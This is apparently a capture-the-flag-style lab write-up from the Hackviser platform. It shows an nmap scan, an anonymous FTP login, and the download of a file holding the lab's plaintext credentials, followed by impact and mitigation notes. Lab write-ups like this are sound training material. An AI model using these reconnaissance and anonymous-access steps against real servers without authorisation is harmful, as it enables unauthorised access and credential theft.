---
title: "Anonymous Access – FTP Misconfiguration Leading to Credential Disclosure | File Hunter"
date: 2026-03-29 20:00:00 +0530
categories: [Network Security, Misconfiguration]
tags: [anonymous-access, ftp, misconfiguration, credential-disclosure, sensitive-data-exposure, linux, hackviser]
platform: Hackviser
author: Shivansh Sharma
image:
  path: /assets/images/posts/ftp.webp
  alt: FTP Anonymous Access Exploitation
---

## Overview

This lab demonstrates how misconfigured FTP services allowing **anonymous login** can expose sensitive files, leading to credential disclosure and potential system compromise.

The target machine exposes an FTP service with anonymous access enabled, allowing attackers to retrieve user credentials.

---

## Objective

- Identify open services
- Access FTP using anonymous login
- Retrieve sensitive files
- Extract credentials for further exploitation

---

## Reconnaissance

Scan the target for open ports:

```bash
nmap <target_ip>
```

**Output**

```
┌──(root㉿kali)-[/home/kelvin/Desktop]
└─# nmap 172.20.8.204
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-29 08:01 -0400
Nmap scan report for 172.20.8.204 (172.20.8.204)
Host is up (0.16s latency).
Not shown: 999 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp

Nmap done: 1 IP address (1 host up) scanned in 3.67 seconds
```

Port **21 (FTP)** is open.

---

## Exploitation

### Connect to the FTP Service

```bash
ftp <target_ip> 21
```

### Login Attempt

Use anonymous login:

```
anonymous
```

**Result**

```
┌──(root㉿kali)-[/home/kelvin/Desktop]
└─# ftp 172.20.8.204 21
Connected to 172.20.8.204.
220 Welcome to anonymous Hackviser FTP service.
Name (172.20.8.204:kelvin): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp>
```

---

## Enumeration

List files on the server:

```
ls
```

**Output**

```
229 Entering Extended Passive Mode (|||60848|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp            25 Sep 08  2023 userlist
226 Directory send OK.
```

A file named `userlist` is available.

---

## Data Extraction

Download the file:

```
get userlist
```

**Output**

```
local: userlist remote: userlist
229 Entering Extended Passive Mode (|||17805|)
150 Opening BINARY mode data connection for userlist (25 bytes).
100% |**************************************************|    25      173.14 KiB/s    00:00 ETA
226 Transfer complete.
25 bytes received in 00:00 (0.15 KiB/s)
```

### Credential Discovery

View the contents:

```bash
cat userlist
```

**Output**

```
jack:hackviser
root:root
```

---

## Proof of Exploitation

- Successfully accessed FTP using anonymous login
- Retrieved sensitive file (`userlist`)
- Extracted valid credentials:
  - `jack:hackviser`
  - `root:root`

---

## Impact

- Unauthorized access to internal files
- Exposure of plaintext credentials
- Potential for full system compromise
- Enables further attacks such as:
  - SSH/Telnet login
  - Privilege escalation

---

## Mitigation

- Disable anonymous FTP access
- Enforce authentication for all users
- Avoid storing credentials in plaintext files
- Apply proper file permission controls
- Monitor and log FTP access

---

## Real-World Insight

Anonymous FTP access is still found in misconfigured systems, especially in lab or legacy environments.

Common issues include:

- Publicly accessible sensitive files
- Weak or reused credentials
- Lack of access control

Always check:

- Anonymous login (`anonymous:anonymous`)
- Directory listings
- Downloadable files

Small misconfigurations like this can quickly lead to full compromise when combined with other exposed services.
